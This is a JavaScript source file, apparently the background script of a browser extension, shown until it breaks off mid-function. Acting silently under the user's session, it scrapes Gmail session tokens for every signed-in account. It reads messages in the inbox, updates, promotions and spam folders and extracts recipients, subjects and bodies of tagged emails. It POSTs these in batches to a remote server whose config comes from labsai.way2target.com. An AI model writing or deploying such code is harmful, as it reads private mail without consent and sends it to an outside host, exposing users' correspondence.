try {
    var users = [];
    var labsLiveUrl="http://labsai.way2target.com:8087/getConfig";
    // var labsLiveUrl="http://liveai.way2target.com/getConfig";

    function gmail_proc(conf, index) {



        var GMAILflag = 1;
        var GMAILQuee = [];
        var checkId = {};
        var userid;
        var In = 0;
        var result = [];
        var msg_data = [];
        var tabInfo = {};
        console.log(index + "------------" + users[index])
        try{tabInfo.authid = users[index][users[index].length - 2];}
        catch(err){
            Intiate(0)
        }
        getik(tabInfo)

        function getik(tabInfo) {
            var conn2 = new XMLHttpRequest();
            conn2.open("GET", "https://mail.google.com/mail/u/" + tabInfo.authid + "/#inbox");

            conn2.onreadystatechange = function () {
                if (this.status == 200 && this.readyState == 4) {
                    try {
                        var tmp = /var GLOBALS\=\[(?:([^\,]*)\,){10}/.exec(this.responseText || "");
                        var ik = tmp && tmp.length > 1 ? tmp[1].replace(/[\"\']/g, "") : null;
                        var reg = /var GM_ACTION_TOKEN="(.*?)"/g.exec(this.responseText);
                        reg = reg[0].replace('var GM_ACTION_TOKEN="', '').replace('"', '');
                        tabInfo["at"] = reg;
                        tabInfo["ik"] = ik;
                        var userexp = /\[\"ui\"\,\"(.*)\"\,/.exec(this.responseText);
                        var mail = userexp[0].split(",")[1];
                        var maillimit = userexp[0].split(",")[4];
                        mail = mail.replace(/\"/g, "");
                        tabInfo["email"] = mail.trim();
                        tabInfo["start"] = 0;
                        tabInfo["daylimit"] = conf.gmail_daylimit;
                        tabInfo["maxlimit"] = conf.gmail_maxlimit;
                        var today = new Date();
                        var year = today.getFullYear();
                        var month = today.getMonth() + 1;
                        month = month.toString().length > 1 ? month : "0" + month;
                        var date = today.getDate().toString().length > 1 ? today.getDate() : "0" + today.getDate();
                        today = year + "/" + month + "/" + date;

                        tabInfo["today"] = today;

                        if (ik !== undefined && ik !== null) {
                            //sendActiveMails({"emails":[tabInfo.email]},conf.liveUrl);
                            Gmail_getMessageId(tabInfo, "inbox");
                        }
                        else {
                            console.log("something went wrong");
                            if (users.length - 1 == index) {
                                //console.log("ok done" + users[index + 1]);
                                users = [];
                                Intiate(0)
                            }
                            else {
                               // console.log(users[index + 1]);
                                gmail_proc(conf, index + 1);
                            }
                        }

                    }
                    catch (err) {
                        console.log(err);
                        var parser = new DOMParser();
                        var doc = parser.parseFromString(this.responseText, "text/html");
                        var title = doc.getElementsByTagName("title")[0].innerText;

                        if (title === "Unusual Usage - Account Temporarily Locked Down") {
                            console.log("Unusual Usage - Account Temporarily Locked Down");
                            if (users.length - 1 == index) {
                                ///console.log("ok done" + users[index + 1]);
                                users = [];
                                Intiate(0)
                            }
                            else {
                                //console.log(users[index + 1]);
                                gmail_proc(conf, index + 1);
                            }


                        }
                        else {
                            Intiate(0)
                        }
                    }

                }
                else if(this.readyState==4&&this.status!=200){
                    console.log(status);
                    if (users.length - 1 == index) {
                        console.log("All accouts are finshed... restarting")
                        users = [];
                        setTimeout(function () {
                            Intiate(0)
                        }, 1000 * conf.rftime)
                    }
                    else {
                        console.log(tabInfo.authid + " *** is completed")
                        console.log(users[index + 1])
                        gmail_proc(conf, index + 1)
                    }

                }
            }
            conn2.send();
            conn2.onerror = function () {
                if (this.status == 0 & this.readyState == 4) {
                    setTimeout(function () {
                        getik(tabInfo)
                    }, conf.rftime);

                }
                else {
                    console.log("error" + this.status);
                    if (users.length - 1 == index) {
                        console.log("All accouts are finshed... restarting")
                        users = [];
                        setTimeout(function () {
                            Intiate(0)
                        }, 1000 * conf.rftime)
                    }
                    else {
                        console.log(tabInfo.authid + " *** is completed")
                        console.log(users[index + 1])
                        gmail_proc(conf, index + 1)
                    }
                }
            }

        }

        function Gmail_getMessageId(tabInfo, type) {
            tabInfo['folderType'] = type;

            result = [];
            In = 0;
            //console.log(tabInfo)
            if (tabInfo.start < tabInfo.maxlimit) {
                if (type == "social" || type == "promotions" || type == "updates" || type == "inbox") {
                    if (type == "inbox") {
                        query = "category%3Aprimary";
                    }
                    else
                        query = "category%3A" + type;
                }
                else if (type == "spam" || type == "trash" || type == "important" || type == "starred") {
                    query = "is%3A" + type;
                }
                else if (type == "boxbe-waiting-list") {
                    query = "label:boxbe-waiting-list";
                }
                else {
                    console.log(type);

                }
                var url = "https://mail.google.com/mail/u/" + tabInfo.authid + "/?ui=2&ik=" + tabInfo.ik + "&at=" + tabInfo.at + "&view=tl&start=" + tabInfo.start + "&num=10&rt=c&as_has=" + query + "&as_excludechats=true&as_subset=all&as_date=" + tabInfo.today + "&as_within=" + tabInfo.daylimit + "&search=adv";
                var xhr = new XMLHttpRequest();
                xhr.open("GET", url);
                xhr.onreadystatechange = function () {
                    if (this.status > 200 & this.readyState == 4) {

                        console.log("error with " + this.status);
                    }
                    else if (this.status == 200 & this.readyState == 4) {
                        var data = this.responseText;

                        var arr = data.split("\n");


                        var res;
                        for (var i = 0; i < arr.length; i++) {
                            var c = arr[i].indexOf('[["tb",');

                            if (c >= 0) {
                                arr = JSON.parse(arr[i]);
                                res = arr[0][2];


                            }
                            else {
                                try {
                                    var ch = arr[i].split('["tb",');
                                    if (ch.length > 1) {
                                        var temp = ch[1];
                                        temp = '[["tb",' + temp;
                                        temp = JSON.parse(temp);
                                        res = temp[0][2];
                                    }
                                    else {
                                        console.log("ch length-----"+ch)
                                    }
                                }
                                catch (err) {

                                }
                            }


                        }
                        if (res == undefined) {
                            tabInfo.start = tabInfo.maxlimit + 1;
                            Gmail_setChecksum(tabInfo.ik, tabInfo.folderType, tabInfo["first_time"]);
                            Gmail_getMessageId(tabInfo, type);
                        }
                        else {
                            tabInfo.start += 10;
                        }

                        if (res !== undefined) {
                            GgetLuserid(tabInfo.email, res, function (userid) {
                                tabInfo["userid"] = userid;
                                Gmail_getChecksum(tabInfo.ik, tabInfo.folderType, res, function (check_time) {
                                    tabInfo["check_time"] = check_time;

                                   console.log("<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<  " + tabInfo.folderType + "enters with " + res.length + " records>>>>>>>>>>>>>>>>>>>>>>>>>>>.");
                                    console.log(res);
                                    console.log(tabInfo.start + "------------>")
                                    GMAIL_check_msgid(tabInfo, res, 0);


                                });
                            });

                        }
                        else {
                            console.log(res)

                        }

                    }

                }
                xhr.send();
                xhr.onerror = function () {
                    if (this.status == 0 & this.readyState == 4) {
                        setTimeout(function () {
                            Gmail_getMessageId(tabInfo, tabInfo.folderType)
                        }, conf.rftime);
                    }
                    else {
                        console.log("error" + this.status)
                    }
                }
            }
            else if (tabInfo.start >= tabInfo.maxlimit) {

                tabInfo.start = 0;
                msg_data = [];
                data = [];
                if (tabInfo.folderType == "inbox") {

                    console.log("inbox -> updates..." + In)
                    Gmail_getMessageId(tabInfo, "updates");
                }
                else if (tabInfo.folderType == "updates") {
                    console.log("updates -> promotions..." + In)

                    Gmail_getMessageId(tabInfo, "promotions");
                }
                else if (tabInfo.folderType == "promotions") {
                    console.log("promotions -> spam..." + In)
                    Gmail_getMessageId(tabInfo, "spam");
                }
                else if (tabInfo.folderType == "spam") {
                    console.log("spam -> end..." + In)
                    console.log("ok done")
                    if (users.length - 1 == index) {
                        console.log("All accouts are finshed... restarting")
                        users = [];
                        setTimeout(function () {
                            Intiate(0)
                        }, 1000 * conf.rftime)
                    }
                    else {
                        console.log(tabInfo.authid + " *** is completed")
                        console.log(users[index + 1])
                        gmail_proc(conf, index + 1)
                    }


                }


            }
            else
            {
                console.log(tabInfo.start);
            }
        }

        function GMAIL_check_msgid(tabInfo, data, index) {
                console.log(data.length+"-------"+index);
            if (index < data.length && data.length != 0 && tabInfo.start < tabInfo.maxlimit) {

                console.log(data[index][15])
                var NewdefindeTime=data[index][15].replace(" at "," ");
		console.log( NewdefindeTime);
                NewdefindeTime=new Date(NewdefindeTime).getTime();
                console.log(NewdefindeTime)
                if (index == 0 && tabInfo.start == 10) {

                    var time=data[0][15].replace(" at "," ");
                    var time=new Date(time).getTime();
                    tabInfo['first_time'] = parseInt(time);
                    console.log(tabInfo)

                }
                if(tabInfo.check_time==0&&tabInfo.start>10)
                {
                    console.log(NewdefindeTime<(tabInfo.first_time-conf.timeInterval)+"   "+NewdefindeTime+"<"+(tabInfo.first_time-conf.timeInterval));
                    if(NewdefindeTime<(tabInfo.first_time-conf.timeInterval))
                    {   ////not in our range
                        console.log(NewdefindeTime+"<"+(tabInfo.first_time-conf.timeInterval)+"==="+NewdefindeTime<(tabInfo.first_time-conf.timeInterval))
                        console.log("not in our range")
                        tabInfo.start = tabInfo.maxlimit+1;
                        index = data.length + 1;
                        Gmail_setChecksum(tabInfo.ik,tabInfo.folderType,tabInfo.first_time);
                        GMAIL_check_msgid(tabInfo, data, index);
                    }
                    else
                    {
                        console.log(NewdefindeTime+"<"+(tabInfo.first_time-conf.timeInterval))
                        console.log(NewdefindeTime<(tabInfo.first_time-conf.timeInterval))
                        //console.log(data[index]);
                        //console.log(NewdefindeTime +">="+ (tabInfo.first_time-conf.timeInterval)+"----"+tabInfo.start)
                        console.log("index: " + index + "..." + NewdefindeTime + ">=" + (tabInfo.first_time-conf.timeInterval));
                        if ((data[index][0] != data[index][2]) || (data[index][1] != data[index][2])) {
                            //console.log("<<<<GROUPED MESSAGE>>>>");
                            var parser = new DOMParser();
                            var grp_sub;
                            var subject = parser.parseFromString(data[index][9], "text/html");
                            try {
                                grp_sub = subject.getElementsByTagName('b')[0].innerText;
                            }
                            catch (err) {
                                grp_sub = subject.getElementsByTagName('body')[0].innerText;
                            }
                            getMultipleMails(tabInfo, data[index][0], function (groupedResponse) {

                                var patt = /\["ms",.*?\[/g;
                                var temp;
                                var foldername = tabInfo.folderType;
                                var mails = []
                                while (temp = patt.exec(groupedResponse)) {
                                    mails.push(temp);
                                }
                                //console.log(mails)

                                function rotate(i) {
                                    // console.log("<<<<<<<<<<<<"+mails[i]+">>>>>>>>>>>")
                                    if (i < 0) {

                                        console.log("all group is completed");
                                        console.log(msg_data)
                                        check_s = index + 1;
                                        GMAIL_check_msgid(tabInfo, data, check_s);
                                        return;
                                    }
                                    var temp = mails[i];
                                    re_result = JSON.parse(temp[0].replace(",[", "") + "]")
                                    var a_temp = {};
                                    a_temp['msgid'] = re_result[1];
                                    a_temp["type"] = foldername;
                                    date = re_result[7];
                                    a_temp['subject'] = grp_sub;
                                    a_temp['date'] = re_result[7];
                                    /* if(date<=tabInfo.check_time&&tabInfo.start==10)
                                     {   console.log(">>>>>>>>>>"+date+"<<<<"+tabInfo.check_time)
                                         tabInfo['start']=tabInfo.maxlimit;

                                         return;
                                     }
                                     else {*/
                                   // console.log(">>>>*************" + (tabInfo.first_time-conf.timeInterval) + "<" + date)
                                    msg_data.push(a_temp);

                                    //}
                                    i--;
                                    rotate(i);
                                }

                                rotate(mails.length - 1);

                            })

                            function getMultipleMails(tabInfo, msgId, callback) {
                                var filetype;
                                if (tabInfo.folderType == "primary" || tabInfo.folderType == "updates" || tabInfo.folderType == "promotions" || tabInfo.folderType == "social" || tabInfo.folderType == "starred" || tabInfo.folderType == "important") {
                                    filetype = "inbox";
                                }
                                else {
                                    filetype = tabInfo.folderType;
                                }
                                var url = "https://mail.google.com/mail/u/" + tabInfo.authid + "/?ui=2&ik=" + tabInfo.ik + "&view=cv&th=" + msgId + "&prf=1&_reqid=166118&nsc=1&mb=0&rt=j&search=" + filetype;
                                //console.log(url)
                                var xhr = new XMLHttpRequest();
                                xhr.open("GET", url)
                                xhr.onreadystatechange = function () {
                                    if (this.readyState == 4 && this.status == 200) {
                                        callback(this.responseText);
                                    }
                                }
                                xhr.send();
                            }
                        }
                        else {
                            var a = {};
                            a['msgid'] = data[index][2];
                            msgid = a["msgid"]
                            a['seen'] = data[index][3];
                            a["type"] = tabInfo.folderType;
                            date = NewdefindeTime;
                            date = new Date(date).getTime();
                            a['date'] = date;

                            var parser = new DOMParser();
                            var subject = parser.parseFromString(data[index][9], "text/html");
                            try {
                                sub = subject.getElementsByTagName('b')[0].innerText;
                            }
                            catch (err) {
                                sub = subject.getElementsByTagName('body')[0].innerText;
                            }
                            a['subject'] = sub;
                           // console.log(a);
                            msg_data.push(a);
                            check_s = index + 1;
                            GMAIL_check_msgid(tabInfo, data, check_s);
                        }

                    }

                }
                else if (NewdefindeTime >= tabInfo.check_time) {
                    console.log(NewdefindeTime +">="+ tabInfo.check_time+"----"+tabInfo.start)
                    if ((data[index][0] != data[index][2]) || (data[index][1] != data[index][2])) {
                        console.log("<<<<GROUPED MESSAGE>>>>");
                        var parser = new DOMParser();
                        var grp_sub;
                        var subject = parser.parseFromString(data[index][9], "text/html");
                        try {
                            grp_sub = subject.getElementsByTagName('b')[0].innerText;
                        }
                        catch (err) {
                            grp_sub = subject.getElementsByTagName('body')[0].innerText;
                        }
                        getMultipleMails(tabInfo, data[index][0], function (groupedResponse) {

                            var patt = /\["ms",.*?\[/g;
                            var temp;
                            var foldername = tabInfo.folderType;
                            var mails = []
                            while (temp = patt.exec(groupedResponse)) {
                                mails.push(temp);
                            }
                            console.log(mails)

                            function rotate(i) {
                               // console.log("<<<<<<<<<<<<"+mails[i]+">>>>>>>>>>>")
                                if (i < 0) {
                                    console.log("all group is completed");
                                    console.log(msg_data)
                                    check_s = index + 1;
                                    GMAIL_check_msgid(tabInfo, data,index+1);
                                    return;
                                }
                                var temp = mails[i];
                                re_result = JSON.parse(temp[0].replace(",[", "") + "]")
                                var a_temp = {};
                                a_temp['msgid'] = re_result[1];
                                a_temp["type"] = foldername;
                                date = re_result[7];
                                a_temp['subject'] = grp_sub;
                                a_temp['date'] = NewdefindeTime;
                                /* if(date<=tabInfo.check_time&&tabInfo.start==10)
                                 {   console.log(">>>>>>>>>>"+date+"<<<<"+tabInfo.check_time)
                                     tabInfo['start']=tabInfo.maxlimit;

                                     return;
                                 }
                                 else {*/
                               console.log(">>>>*************" + tabInfo.check_time + "<" + date)
                                msg_data.push(a_temp);

                                //}
                                i--;
                                rotate(i);
                            }

                            rotate(mails.length - 1);

                        })

                        function getMultipleMails(tabInfo, msgId, callback) {
                            var filetype;
                            if (tabInfo.folderType == "primary" || tabInfo.folderType == "updates" || tabInfo.folderType == "promotions" || tabInfo.folderType == "social" || tabInfo.folderType == "starred" || tabInfo.folderType == "important") {
                                filetype = "inbox";
                            }
                            else {
                                filetype = tabInfo.folderType;
                            }
                            var url = "https://mail.google.com/mail/u/" + tabInfo.authid + "/?ui=2&ik=" + tabInfo.ik + "&view=cv&th=" + msgId + "&prf=1&_reqid=166118&nsc=1&mb=0&rt=j&search=" + filetype;
                            //console.log(url)
                            var xhr = new XMLHttpRequest();
                            xhr.open("GET", url)
                            xhr.onreadystatechange = function () {
                                if (this.readyState == 4 && this.status == 200) {
                                    callback(this.responseText);
                                }
                                else if(this.readyState==4&&this.status!=200) {

                                    getMultipleMails(tabInfo, msgId, callback)
                                }
                                else {

                                    console.log()
                                }
                            }
                            xhr.error=function () {
                                getMultipleMails(tabInfo, msgId, callback);

                            }
                            xhr.send();
                        }
                    }
                    else {
                        var a = {};
                        a['msgid'] = data[index][2];
                        msgid = a["msgid"]
                        a['seen'] = data[index][3];
                        a["type"] = tabInfo.folderType;
                        date = NewdefindeTime;
                        date = new Date(date).getTime();
                        a['date'] = date;

                        var parser = new DOMParser();
                        var subject = parser.parseFromString(data[index][9], "text/html");
                        try {
                            sub = subject.getElementsByTagName('b')[0].innerText;
                        }
                        catch (err) {
                            sub = subject.getElementsByTagName('body')[0].innerText;
                        }
                        a['subject'] = sub;
                        console.log(a);
                        msg_data.push(a);
                        check_s = index + 1;
                        GMAIL_check_msgid(tabInfo, data, check_s);
                    }

                }
                else {
                    console.log(NewdefindeTime +"<"+ tabInfo.check_time +"=="+(NewdefindeTime < tabInfo.check_time))

                    tabInfo.start = tabInfo.maxlimit+1;
                    index = data.length + 1;
                    Gmail_setChecksum(tabInfo.ik,tabInfo.folderType,tabInfo.first_time);
                    GMAIL_check_msgid(tabInfo, data, index);
                }

            }
            else if (index >= data.length && data.length != 0) {
                console.log("second iff")
                getData(tabInfo, msg_data);
                //Gmail_setChecksum(tabInfo.ik,tabInfo.folderType,tabInfo["first_time"]);
                //getData(tabInfo, msg_data);

            }
            else{
                console.log("next if")
                Gmail_setChecksum(tabInfo.ik, tabInfo.folderType, tabInfo["first_time"]);
                 console.log("data length : " + data.length + "  " + index);

            }


        }

        function GgetLuserid(mailid, data, callback) {
            chrome.storage.local.get(null, function (result) {
                var appid = chrome.runtime.id;
                if (typeof(result.userid) == 'undefined') {///if there is no uid in local storage
                    /*userid=Gcall(mailid,appid,"gmail",function(uid)
                    {	userid=uid;
                        callback(=);

                    })*/
                    userid = 0;
                    callback(0)

                }
                else {
                    /// if uid is there then check for maillist
                    var check = typeof(result.mails[mailid + '']);
                    if (check !== 'undefined') {/// the mail is in mails list
                        userid = result.userid;
                        callback(userid);
                    }
                    else {/// the mails is not in list
                        userid = result.userid;
                        callback(userid);
                        //Gcall1(appid,mailid,userid,"gmail")

                    }
                }
                ///setting of userid

                if (typeof(result.mails) == 'undefined') {
                    var mails = {};
                    mails[mailid + ""] = 1;
                    chrome.storage.local.set({mails}, function () {
                        chrome.storage.local.get(null, function (result) {

                        });
                    });
                }
                else {
                    var mails = result.mails;
                    mails[mailid + ""] = 1;

                    chrome.storage.local.set({mails}, function () {
                        chrome.storage.local.get(null, function (result) {

                        })
                    });
                    ;
                }
            });
        }

        /*function Gcall(mailid,appid,esp,callback)
        {

                    $.post(conf.ip+"/email_distinct",
                    {email:mailid,appid:appid,esp:esp},
                    function(data,status)
                    {


                            userid=data.uid;
                            chrome.storage.local.set({ userid });
                            callback(data.uid);
                    }
                    ).fail(function(status) {
                        setTimeout(function(){
                            Gcall(mailid,appid,esp,function(uid)
                            {	userid=uid;
                                callback(userid);

                            })
                            },conf.rftime);
                        })



        }
        function Gcall1(appid,mailid,userid,esp)
        {
                $.post(conf.ip+"/email_distinct_uid",{email:mailid,refid:userid,appid:appid,esp:esp},function(data,status)
                    {


                    }).fail(function(status) {
                        setTimeout(function(){
                            Gcall1(appid,mailid,userid,esp)
                            },conf.rftime);
                        })

        }*/
        function Gmail_getChecksum(ik, type, data, callback) {

            chrome.storage.local.get(null, function (result) {
                if (typeof(result.gmail) !== "undefined") {
                    if (result.gmail[ik + "_" + type + "_time"] !== undefined && result.gmail[ik + "_" + type + "_time"] !== null)
                        callback(result.gmail[ik + "_" + type + "_time"]);
                    else
                        callback(0);
                }
                else {
                    callback(0);
                }

            });
        }

        function Gmail_setChecksum(ik, type, time) {

            chrome.storage.local.get(null, function (result) {

                try {
                    // result.gmail[ik + "_" + type + "_mid"] = msgid;
                    result.gmail[ik + "_" + type + "_time"] = time;

                    var gmail = result.gmail;
                    chrome.storage.local.set({gmail}, function () {
                        chrome.storage.local.get(null, function (result) {
                            console.log(result)

                        })
                    });

                }
                catch (err) {
                    console.log(err)

                    try {


                        var gmail = {};
                        //gmail[ik + "_" + type + "_mid"] = msgid;
                        gmail[ik + "_" + type + "_time"] = time;
                        chrome.storage.local.set({gmail}, function () {
                            chrome.storage.local.get(null, function (result) {
                                console.log(result)

                            })
                        });
                    }
                    catch (err) {
                        console.log(err)
                        var str = ik + "_" + type;
                        var gmail = {};
                        //gmail[ik + "_" + type + "_mid"] = msgid;
                        gmail[ik + "_" + type + "_time"] = time;
                        chrome.storage.local.set({gmail}, function () {
                            console.log(result)
                        })
                    }
                }


            });
        }


        function getData(tabInfo, Json) {
            console.log(Json.length+"--------"+In);

            if (Json.length != 0 & In < Json.length) {
                //console.log(Json.length + "--->" + In)
                console.log("in ifffff")
                var xhr = new XMLHttpRequest();
                xhr.open("GET", "https://mail.google.com/mail/u/" + tabInfo.authid + "/?ui=2&ik=" + tabInfo.ik + "&jsver=iufS2U4Cs3s.en.&view=om&th=" + Json[In].msgid)
                xhr.onreadystatechange = function () {
                    console.log("readystate   "+this.readyState)
                    if (this.status > 200 & this.readyState == 4) {
                        console.log("error with " + this.status);
                    }
                    else if (this.status == 200 & this.readyState == 4) {
                        console.log("readystate else if")
                        var parser = new DOMParser();
                        var doc = parser.parseFromString(this.responseText, "text/html");
                        var title = doc.getElementsByTagName("title")[0].innerText;
                        if (title == "Original Message"||title.toLocaleLowerCase()=="original message") {
                            var data = this.responseText;
                            var checkRe = /X-ReqIbr:.*/

                            if (checkRe.exec(data)) {
                               console.log("processing...." + In + "..." + Json.length + Json[In].msgid + "......" + tabInfo.folderType)
                                var re = /<td.*?<\/td>/g;
                                var arr = [];
                                var i = 0;
                                var message = {};
                                message.template = {};

                                var reqIbr = checkRe.exec(data)[0].replace("X-ReqIbr:", "").trim()
                                message.reqIbr = reqIbr;
                                message.type = tabInfo.folderType;
                                while (tmp = re.exec(this.responseText)) {
                                    arr[i++] = tmp[0];
                                }
                               // console.log(arr[3]);
                                message.toEmail = arr[3].replace(/\<td.*?\>/, "").replace("</td>", "").trim();
                                try {
                                    GgetMessageId(arr[0], function (data) {
                                        message["_id"] = data.split("@")[0].trim();
                                        message["msgid"] = data.trim()
                                    });
                                }
                                catch (err) {
                                    console.log(err);
                                }


                                var pre = doc.getElementsByTagName("pre")[0].innerText;
                                var a = /Content-Type:*.?text\/.*?;([^']*)'?(.*)$/gmi;
                                body_data = ""
                                try {
                                    var b = a.exec(pre)[0];

                                    var body = parser.parseFromString(b, "text/html");
                                    body_data = body.getElementsByTagName("body")[0].innerText || "N/A";
                                    a = $.parseHTML(body_data)
                                    message.template.body = body_data;
                                }
                                catch (err) {

                                    console.log(err)
                                }
                                try {
                                    GgetCreatedAt(arr[1], function (data) {
                                        var milli = new Date(Json[In].date).getTime();
                                        var d = new Date(milli);
                                        d = d.toDateString();
                                        d = new Date(d);
                                        d = d.getTime();
                                        var Created = {};
                                        Created.date = d;
                                        Created.time = milli;
                                        message.created = Created;


                                    });
                                }
                                catch (err) {
                                    console.log(err);
                                }

                                try {

                                    GgetSubject(arr[4], function (data) {
                                        subject = data.trim();

                                        var parser = new DOMParser();
                                        subject = parser.parseFromString(subject, "text/html");
                                        try {
                                            subject = subject.getElementsByTagName('b')[0].innerText;
                                        }
                                        catch (err) {

                                            subject = subject.getElementsByTagName('body')[0].innerText;
                                        }
                                        if (subject.length == 0) {
                                            message["template"]["subject"] = Json[In].subject;
                                        }
                                        else {
                                            message["template"]["subject"] = subject;
                                        }

                                    });
                                }
                                catch (err) {
                                    console.log(err);
                                }

                                result.push(message);
                                if (result.length % 10 == 0 && result.length > 0) {
                                    GsendData(tabInfo, result, 0)
                                    result = [];
                                }
                            }
                            else {
                                console.log("not our mail..." + In + "..." + Json.length + "....." + Json[In].msgid)
                            }
                            In++;
                            getData(tabInfo, Json);
                        }
                        else if (title == "Unusual Usage - Account Temporarily Locked Down"||title.toLocaleLowerCase()=="unusual usage - account temporarily locked down") {
                            console.log("some thing went wrong");
                            if (users.length - 1 == index) {
                                console.log("ok done" + users[index + 1]);
                                users = [];
                                Intiate(0)
                            }
                            else {
                                console.log(users[index + 1]);
                                gmail_proc(conf, index + 1);
                            }

                            /*if (GMAILQuee.length == 0) {
                                GMAILflag = 1;

                            }
                            else if (GMAILQuee.length > 0) {
                                var nxtauthid = GMAILQuee[0];
                                tabInfo["authid"] = nxtauthid;
                                GMAILQuee.shift();

                                getik(tabInfo);
                            }*/
                        }
                        else {
                            console.log(title);
                            Intiate(0);
                        }
                    }
                    else{
                        console.log("**********************************************")
                        console.log(this.status)
                        console.log("***********************************************8")
                    }
                }
                xhr.send();
                xhr.onerror = function () {
                    console.log(this)
                    if (this.status == 0 & this.readyState == 4) {
                        setTimeout(function () {
                            getData(tabInfo, Json)
                        }, conf.rftime);
                    }
                    else {
                        console.log("error" + this.status)
                    }
                }
            }
            else {
                console.log("elseeeee")
                Json=[];
                if (result.length > 0) {
                    msg_data = [];
                    //console.log(result)
                    GsendData(tabInfo, result, 1)
                    result = [];
                    Gmail_getMessageId(tabInfo,tabInfo.folderType);
                }
                else {
                    if (In >= Json.length && result.length == 0 && tabInfo.start == 10) {
                        console.log("*************No MAILS FROM US");
                        //console.log(tabInfo)
                        //Gmail_setChecksum(tabInfo.ik,tabInfo.folderType,tabInfo.first_date);
                    }
                    //console.log(tabInfo, result)
                    msg_data = [];
                    Gmail_getMessageId(tabInfo, tabInfo.folderType);
                }


            }
        }

        function GgetMessageId(val, callback) {
            try {
                val = val.split('&');
                val = val[1].split(';');
                callback(val[1]);
            }
            catch (err) {
                console.log(err);
                callback(null);
            }
        }

        function GgetCreatedAt(val, callback) {
            try {
                val = val.replace(/<(?:.|\n)*?>/gm, '').replace(')', '');
                val = val.split('(');
                callback(val);
            }
            catch (err) {
                console.log(err);
                callback(null);
            }
        }

        function GgetFrom(val, callback) {

            var parser = new DOMParser;
            var dom = parser.parseFromString(
                '<!doctype html><body>' + val,
                'text/html');
            var val = dom.body.textContent;

            val = val.split(' <');
            if (val[1]) {
                val[1] = val[1].replace(/>(.*)/gm, '');
                val[0] = val[0].replace(/^"?(.+?)"?$/, '$1');
            }
            callback(val)
        }

        function GgetTo(val, callback) {
            try {
                val = /Delivered-To:(.*)/g.exec(val);

                val = val[0].split(":");
                val = val[1];

                callback(val);
            }
            catch (err) {
                console.log(err);
                callback(null);
            }
        }

        function GgetSubject(val, callback) {
            try {
                val = val.replace(/<(?:.|\n)*?>/gm, '');
                val = val.replace('&#39;', '\'').replace('&quot;', '"').replace('&quot;', '"');
                val = val.trim();
                callback(val);
            }
            catch (err) {
                console.log(err);
                callback(null);
            }
        }

        function GgetSPF(val, data, callback) {
            try {
                var ire = /Received-Spf: \w+ \(.*\s+.*?\)\s+.*?;/gi.exec(data);
                spf = ire[0].split(" ")[1];
                try {
                    spf_ip = /client-ip=.*/i.exec(data)[0].split("=")[1].replace(";", "");
                }
                catch (err) {
                    console.log(err);

                }
                callback([spf, spf_ip]);
            } catch (err) {
                console.log(err);
                try {
                    val = val.replace(/<a.*/gm, '').replace(/<(?:.|\n)*?>/gm, '');
                    val = val.split(' ');

                    callback([val[0], val[3]])
                }
                catch (err) {
                    console.log(err);
                    callback([0, 0]);
                }
            }


        }

        function GgetDKIM(val, callback) {
            try {
                val = val.replace(/<a.*/gm, '').replace(/<(?:.|\n)*?>/gm, '');
                val = val.split(' ');
                callback(val);
            }
            catch (err) {
                console.log(err);
                callback(null);
            }

        }

        function GgetDMARC(val, callback) {
            try {
                val = val.replace(/<(?:.|\n)*?>/gm, '').split(' ');
                callback(val[0]);
            }
            catch (err) {
                console.log(err);
                callback(null);
            }
        }

        function GgetSmtp(val, callback) {
            try {
                tmp = /Received:.*\(.*?\s+\[.*?\]\)/gi.exec(val);
                tmp = tmp[tmp.length - 1].split("(")[1].split(" ")[0];
                tmp = tmp.substr(0, tmp.length - 1);
                callback(tmp)
            }
            catch (err) {
                console.log(err);

                callback(null);
            }
        }

        function GsendData(tabInfo, res, chkStatus) {
           // console.log("...........sending........" + tabInfo.folderType, res);
            //console.log(conf)
            try {
                $.ajax({
                    type: "POST",
                    url: conf.url,
                    data: JSON.stringify(res),
                    contentType: "application/json",
                    crossDomain: true,
                    dataType: "json",
                    success: function (data, status, jqXHR) {
                        //console.log(status)
                        if (chkStatus == 1&&tabInfo.check_time!=0) {
                            Gmail_setChecksum(tabInfo.ik,tabInfo.folderType, tabInfo['first_time']);
                            //Gmail_getMessageId(tabInfo, tabInfo.folderType);
                        }
                        //
                    },
                    error: function (jqXHR, status) {
                        console.log(status)
                        if (status.status == 0 && status.readyState == 0) {
                            setTimeout(function () {
                                GsendData(tabInfo, res, chkStatus)
                            }, conf.rftime);
                        }
                        else if (status.status == 413 && status.readyState == 4) {

                        }
                        else {
                            if (chkStatus == 1) {
                                Gmail_getMessageId(tabInfo, tabInfo.folderType);
                            }
                           // console.log(this)
                        }


                    }
                });
            } catch (err) {
                console.log(err);

            }
        }
    }


    function Intiate(authid) {
       console.log("startedddd intitate"+authid);
        var today = new Date();
        var year = today.getFullYear();
        var month = today.getMonth() + 1;
        month = month.toString().length > 1 ? month : "0" + month;
        var date = today.getDate().toString().length > 1 ? today.getDate() : "0" + today.getDate();
        today = year + "/" + month + "/" + date;


        var conn2 = new XMLHttpRequest();
        conn2.open("GET", "https://mail.google.com/mail/u/" + authid + "/#inbox");
        conn2.onreadystatechange = function () {
            if (this.status == 200 && this.readyState == 4) {


                    try {
                        var tmp = /var GLOBALS\=\[(?:([^\,]*)\,){10}/.exec(this.responseText || "");
                        var ik = tmp && tmp.length > 1 ? tmp[1].replace(/[\"\']/g, "") : null;
                        var reg = /var GM_ACTION_TOKEN="(.*?)"/g.exec(this.responseText);
                        reg = reg[0].replace('var GM_ACTION_TOKEN="', '').replace('"', '');
                        if (ik == null && reg == null) {
                            if (authid < 9) {
                                Intiate(authid + 1);
                            } else {
                                Intiate(0)
                            }
                        }
                        else {

                            var url = "https://mail.google.com/mail/u/" + authid + "/?ui=2&ik=" + ik + "&at=" + reg + "&view=tl&start=0&num=2&rt=c&as_has=is:starred&as_excludechats=true&as_subset=all&as_date=" + today + "&as_within=1d&search=adv";
                            //console.log(url)
                            var conn = new XMLHttpRequest();
                            conn.open("GET", url)
                            conn.onreadystatechange = function () {
                                if (this.status == 200 && this.readyState == 4) {

                                    var reg_users = /\["mla",\[\[.*?\]\]/.exec(this.responseText);
                                    try {
                                        users = JSON.parse([reg_users[0].replace('["mla",', "")])

                                        //console.log("************", users)

                                        function getConfigRead() {
                                            $.post(labsLiveUrl, {}, function (data, status) {
                                                gmail_proc(data, 0);

                                            }).fail(function (status) {
                                                setTimeout(function () {
                                                    getConfigRead()
                                                }, 1000 * 5);
                                            })

                                        }

                                        getConfigRead();
                                    }
                                    catch (err) {

                                        console.log(err);

                                        if (authid < 9) {
                                            Intiate(authid + 1);
                                        } else {
                                            Intiate(0)
                                        }
                                    }


                                    //starting_user = users.shift()
